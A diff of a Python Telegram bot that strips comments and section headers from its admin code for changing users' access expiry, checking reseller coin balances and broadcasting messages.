     chat_id = message.chat.id
     user_id = message.text.strip()
 
-    # Validate if user exists
     if user_id not in users:
         bot.reply_to(message, f"❌ 𝗨𝘀𝗲𝗿 {user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗼𝗿 𝗵𝗮𝘀 𝗻𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀.")
         return
@@ -1218,10 +1079,8 @@ def ask_durations(call):
     chat_id = call.message.chat.id
     time_unit = "days" if call.data == "time_days" else "hours"
 
-    # Store the selected time unit
     admin_sessions[chat_id]["time_unit"] = time_unit
 
-    # Edit the message to ask for the number of days/hours
     bot.edit_message_text(
         chat_id=chat_id, 
         message_id=call.message.message_id, 
@@ -1250,43 +1109,30 @@ def process_duration(message):
         else:
             duration_in_hours = duration_value
 
-        # Get current expiration time
         current_expiry = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
 
         if action == "increase_access":
             new_expiry = current_expiry + datetime.timedelta(hours=duration_in_hours)
             change_type = "𝗲𝘅𝘁𝗲𝗻𝗱𝗲𝗱"
-        else:  # Decrease case
+        else:
             new_expiry = current_expiry - datetime.timedelta(hours=duration_in_hours)
             change_type = "𝗿𝗲𝗱𝘂𝗰𝗲𝗱"
 
-        # Prevent negative expiration
         if new_expiry < datetime.datetime.now():
             bot.reply_to(message, f"⚠️ 𝗨𝘀𝗲𝗿 {user_id}'𝘀 𝗮𝗰𝗰𝗲𝘀𝘀 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝗿𝗲𝗱𝘂𝗰𝗲𝗱 𝗳𝘂𝗿𝘁𝗵𝗲𝗿!")
             return
 
-        # Update user's expiration time
         users[user_id] = new_expiry.strftime('%Y-%m-%d %H:%M:%S')
-        save_users()  # Save changes
+        save_users()
 
-        # Notify Admin
         bot.reply_to(message, f"✅ 𝗨𝘀𝗲𝗿 {user_id}'𝘀 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 {change_type} 𝗯𝘆 {duration_value} {time_unit}.\n"
                               f"📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {convert_utc_to_ist(users[user_id])}")
 
-        # Notify User
         bot.send_message(user_id, f"🔔 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 {change_type} 𝗯𝘆 {duration_value} {time_unit}.\n"
                                   f"📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {convert_utc_to_ist(users[user_id])}")
 
     except ValueError:
         bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!")
-        
-# --------------------------------------------------------------
-        
-
-        
-        
-        
-# --------------------[ RESELLERS PANEL SETTINGS ]------------------
         
 @bot.message_handler(commands=['addreseller'])
 def add_reseller_command(message):
@@ -1404,7 +1250,6 @@ def check_balance_command(message):
     user_id = str(message.chat.id)
 
     if user_id in admin_id:
-        # If the user is an admin, show all resellers and their balances
         if not resellers:
             response = "ℹ️ 𝗡𝗼 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱"
         else:
@@ -1412,23 +1257,12 @@ def check_balance_command(message):
             for reseller, data in resellers.items():
                 response += f"👤 `{reseller}` → 💰 {data['coins']} 𝗰𝗼𝗶𝗻𝘀\n"
     elif user_id in resellers:
-        # If the user is a reseller, show their own balance
         balance = resellers[user_id]['coins']
         response = f"💰 𝗬𝗼𝘂𝗿 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} 𝗰𝗼𝗶𝗻𝘀"
     else:
-        # If the user is neither an admin nor a reseller, deny access
         response = "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗿 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻."
 
     bot.send_message(message.chat.id, response, parse_mode="Markdown")
-    
-# ------------------------------------------------------------
-        
-
-        
-        
-        
-# --------------------[ BROADCAST SETTINGS ]------------------
-
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
@@ -1438,8 +1272,7 @@ def broadcast_message(message):
         response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 DM TO BUY @NINJAGAMEROP"
         bot.reply_to(message, response)
         return
-    
-    # Split the message to check for user ID or broadcast message
+
     msg_parts = message.text.split(" ", 2)
 
     if len(msg_parts) == 3:
@@ -1447,14 +1280,13 @@ def broadcast_message(message):
         broadcast_message = msg_parts[2]
 
         try:
-            target_user_id = int(target_user_id)  # Convert to int to verify it's a user ID
+            target_user_id = int(target_user_id)
             bot.send_message(target_user_id, broadcast_message)
             response = f"📤 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝘂𝘀𝗲𝗿 {target_user_id}."
         except ValueError:
             response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘂𝘀𝗲𝗿 𝗜𝗗."
     else:
         broadcast_message = msg_parts[1]
-        # Send to all users (for example, keep track of all users in the users list)
         for user_id in users:
             try:
                 bot.send_message(user_id, broadcast_message)
@@ -1474,4 +1306,3 @@ if __name__ == "__main__":
             bot.polling(none_stop=True, interval=0.5, timeout=10, long_polling_timeout=5)
         except Exception as e:
             print(e)
-        
